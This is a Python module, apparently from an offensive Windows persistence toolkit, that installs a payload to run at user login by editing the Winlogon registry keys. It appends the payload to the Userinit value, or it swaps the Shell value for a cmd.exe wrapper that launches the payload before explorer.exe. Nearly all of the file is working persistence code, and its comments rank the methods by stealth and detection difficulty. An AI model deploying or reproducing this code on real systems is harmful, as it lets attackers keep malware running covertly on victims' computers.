"""
Winlogon registry persistence methods (Userinit and Shell)
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_command, validate_payload_path, check_admin, parse_reg_query_output
from config import REGISTRY_PATHS


class WinlogonPersistence:
    """Handles Winlogon-based persistence methods"""
    
    def __init__(self):
        self.is_admin = check_admin()
        self.winlogon_path = REGISTRY_PATHS['winlogon']
    
    def install_userinit(self, payload_path):
        """
        Install persistence via Winlogon Userinit
        Runs during user login process - stealthier than Run keys
        
        Args:
            payload_path (str): Path to payload
            
        Returns:
            dict: Installation result with removal command
        """
        print("[*] Installing Winlogon Userinit persistence...")
        
        if not self.is_admin:
            print("[!] This method requires administrator privileges")
            print("    Winlogon modifications require elevated access")
            return None
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Get current userinit value
        query_cmd = f'reg query "{self.winlogon_path}" /v Userinit'
        result = run_command(query_cmd, require_admin=True)
        
        if not result or not result['success']:
            print("[-] Failed to query current Userinit value")
            return None
        
        # Default value
        current_value = r"C:\Windows\system32\userinit.exe,"
        
        # Parse actual value from registry
        parsed_value = parse_reg_query_output(result['stdout'], 'Userinit')
        if parsed_value:
            current_value = parsed_value
        
        print(f"[*] Current Userinit value: {current_value}")
        
        # Ensure it ends with comma for proper chaining
        if not current_value.endswith(','):
            current_value += ','
        
        # Append our payload
        new_value = f"{current_value}{payload_path}"
        
        # Install persistence
        command = f'reg add "{self.winlogon_path}" /v Userinit /t REG_SZ /d "{new_value}" /f'
        result = run_command(command, require_admin=True)
        
        if result and result['success']:
            print(f"[+] Persistence installed successfully!")
            print(f"    Location: {self.winlogon_path}\\Userinit")
            print(f"    Original: {current_value}")
            print(f"    Modified: {new_value}")
            print(f"    Trigger: User login (winlogon process)")
            print(f"    Admin Required: Yes")
            print(f"    Detection: Medium difficulty")
            
            return {
                'method': 'winlogon_userinit',
                'path': self.winlogon_path,
                'original_value': current_value,
                'new_value': new_value,
                'payload': payload_path,
                'requires_admin': True,
                'remove_command': f'reg add "{self.winlogon_path}" /v Userinit /t REG_SZ /d "{current_value}" /f'
            }
        else:
            print(f"[-] Failed to install persistence")
            if result:
                print(f"    Error: {result.get('stderr', 'Unknown error')}")
            return None
    
    def install_shell(self, payload_path):
        """
        Install persistence via Winlogon Shell
        Replaces default shell (explorer.exe) - very powerful but suspicious
        
        Args:
            payload_path (str): Path to payload
            
        Returns:
            dict: Installation result with removal command
        """
        print("[*] Installing Winlogon Shell persistence...")
        print("[!] WARNING: This replaces the Windows shell (explorer.exe)")
        print("[!] Your payload MUST launch explorer.exe or user will have no desktop")
        
        if not self.is_admin:
            print("[!] This method requires administrator privileges")
            return None
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Default shell
        original_shell = "explorer.exe"
        
        # Our payload should launch explorer.exe after executing
        # This ensures the user still gets their desktop
        new_shell = f'cmd.exe /c "{payload_path} & explorer.exe"'
        
        print(f"[*] Original Shell: {original_shell}")
        print(f"[*] New Shell: {new_shell}")
        
        # Confirm this dangerous operation
        print("\n[!] This is a DANGEROUS operation that can break the user's desktop!")
        print("[!] Ensure your payload is correct before proceeding.")
        
        command = f'reg add "{self.winlogon_path}" /v Shell /t REG_SZ /d "{new_shell}" /f'
        result = run_command(command, require_admin=True)
        
        if result and result['success']:
            print(f"[+] Persistence installed successfully!")
            print(f"    Location: {self.winlogon_path}\\Shell")
            print(f"    Original: {original_shell}")
            print(f"    Modified: {new_shell}")
            print(f"    Trigger: User login (replaces explorer)")
            print(f"    Admin Required: Yes")
            print(f"    Detection: Hard (very suspicious)")
            print(f"\n[!] IMPORTANT: Desktop will launch after payload executes")
            print(f"[!] If payload fails, user may not get a desktop!")
            
            return {
                'method': 'winlogon_shell',
                'path': self.winlogon_path,
                'original_value': original_shell,
                'new_value': new_shell,
                'payload': payload_path,
                'requires_admin': True,
                'dangerous': True,
                'remove_command': f'reg add "{self.winlogon_path}" /v Shell /t REG_SZ /d "{original_shell}" /f'
            }
        else:
            print(f"[-] Failed to install persistence")
            if result:
                print(f"    Error: {result.get('stderr', 'Unknown error')}")
            return None
    
    def get_current_userinit(self):
        """
        Get current Userinit value
        
        Returns:
            str: Current Userinit value or None
        """
        query_cmd = f'reg query "{self.winlogon_path}" /v Userinit'
        result = run_command(query_cmd)
        
        if result and result['success']:
            return parse_reg_query_output(result['stdout'], 'Userinit')
        return None
    
    def get_current_shell(self):
        """
        Get current Shell value
        
        Returns:
            str: Current Shell value or None
        """
        query_cmd = f'reg query "{self.winlogon_path}" /v Shell'
        result = run_command(query_cmd)
        
        if result and result['success']:
            return parse_reg_query_output(result['stdout'], 'Shell')
        return None